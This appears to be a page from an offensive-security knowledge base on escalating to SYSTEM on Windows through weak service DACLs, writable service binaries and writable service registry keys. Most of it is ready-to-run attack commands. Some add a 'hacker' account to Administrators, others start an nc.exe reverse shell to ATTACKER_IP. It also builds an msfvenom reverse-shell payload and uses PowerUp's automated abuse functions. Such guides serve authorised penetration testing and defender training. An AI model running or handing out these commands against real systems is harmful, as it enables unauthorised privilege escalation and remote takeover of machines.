---
title: 'Weak Service Permissions'
description: 'Exploiting weak Windows service DACLs (SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS) and writable service binaries for privilege escalation.'
---

# Weak Service Permissions

## Two Types of Weak Permissions

| Type | What's Weak | Exploitation |
|:-----|:-----------|:-------------|
| **Weak Service DACL** | Service configuration is modifiable | Change `binPath` to your payload |
| **Writable Service Binary** | The `.exe` file itself is writable | Replace the binary with your payload |

---

## Type 1: Weak Service DACLs

### Finding Modifiable Services

```cmd
:: Check services modifiable by your user
accesschk.exe -uwcqv "YourUser" * /accepteula

:: Check services modifiable by common groups
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

:: PowerUp (automated)
Import-Module .\PowerUp.ps1
Get-ModifiableService
```

### Dangerous Service Access Rights

| Right | Hex Value | Risk |
|:------|:---------|:-----|
| `SERVICE_ALL_ACCESS` | `0xF01FF` | Full control — can do anything |
| `SERVICE_CHANGE_CONFIG` | `0x0002` | Can change binpath, start type, service account |
| `SERVICE_START` | `0x0010` | Can start the service |
| `SERVICE_STOP` | `0x0020` | Can stop the service |
| `WRITE_DAC` | `0x40000` | Can modify the service's DACL |
| `WRITE_OWNER` | `0x80000` | Can change the owner |

You need at minimum `SERVICE_CHANGE_CONFIG` + `SERVICE_START` (or ability to reboot).

### Exploitation — Modify binPath

```cmd
:: Step 1: Check current service configuration
sc qc VulnService

:: Step 2: Note the original binpath (for cleanup)
:: SERVICE_START_NAME: LocalSystem  ← confirms it runs as SYSTEM

:: Step 3: Change the binary path to your command
sc config VulnService binPath= "cmd /c net localgroup Administrators hacker /add"

:: Step 4: Restart the service
sc stop VulnService
sc start VulnService
```

!!! warning "Syntax: Space After `binPath=`"
    The space after `binPath=` is **mandatory**. `binPath="cmd..."` will silently fail. Always use `binPath= "cmd..."`.

#### Reverse Shell Variant

```cmd
sc config VulnService binPath= "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
sc stop VulnService
sc start VulnService
```

#### PowerUp Automated Abuse

```powershell
# Automatically exploit a modifiable service
Invoke-ServiceAbuse -Name 'VulnService' -UserName 'hacker' -Password 'Password123!'

# Or with a custom command
Invoke-ServiceAbuse -Name 'VulnService' -Command "net localgroup Administrators hacker /add"
```

### Service Will "Fail"

Windows expects the service to respond within ~30 seconds with a proper service status. Since your command isn't a real service binary, the service will report a **failure/timeout**. This is normal — your command still executes as SYSTEM.

### Clean Up

```cmd
:: Restore original binpath
sc config VulnService binPath= "C:\Original\Path\To\service.exe"
sc start VulnService
```

---

## Type 2: Writable Service Binaries

### Finding Writable Binaries

```cmd
:: Check writable files in Program Files
accesschk.exe -uwqs "Users" "C:\Program Files\*.*" /accepteula
accesschk.exe -uwqs "Users" "C:\Program Files (x86)\*.*" /accepteula
accesschk.exe -uwqs "Everyone" "C:\Program Files\*.*" /accepteula

:: Check specific service binary permissions
icacls "C:\Program Files\VulnApp\service.exe"

:: PowerUp (automated)
Import-Module .\PowerUp.ps1
Get-ModifiableServiceFile
```

### icacls Permission Flags to Look For

| Flag | Meaning | Exploitable? |
|:-----|:--------|:------------|
| `(F)` | Full Control | ✅ Yes |
| `(M)` | Modify | ✅ Yes |
| `(W)` | Write | ✅ Yes |
| `(R)` | Read | ❌ No |
| `(RX)` | Read & Execute | ❌ No |

### Exploitation — Replace the Binary

```cmd
:: Step 1: Back up the original (for cleanup)
copy "C:\Program Files\VulnApp\service.exe" C:\temp\service.exe.bak

:: Step 2: Replace with your payload
copy /Y C:\temp\reverse_shell.exe "C:\Program Files\VulnApp\service.exe"

:: Step 3: Restart the service
sc stop VulnService
sc start VulnService
```

```bash
# Generate payload on attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o reverse_shell.exe
```

### PowerUp Automated

```powershell
# Automatically replace a writable service binary
Install-ServiceBinary -Name 'VulnService'

# Or with specific binary
Install-ServiceBinary -Name 'VulnService' -Path 'C:\temp\payload.exe'
```

---

## Weak Service Registry Permissions

### Finding Modifiable Registry Keys

```cmd
:: Check if Users can modify service registry entries
accesschk.exe -kvuqsw "Users" "HKLM\System\CurrentControlSet\Services" /accepteula
```

### Exploitation

If you can write to a service's registry key, modify `ImagePath`:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\payload.exe" /f

:: Restart service
sc stop VulnService
sc start VulnService
```
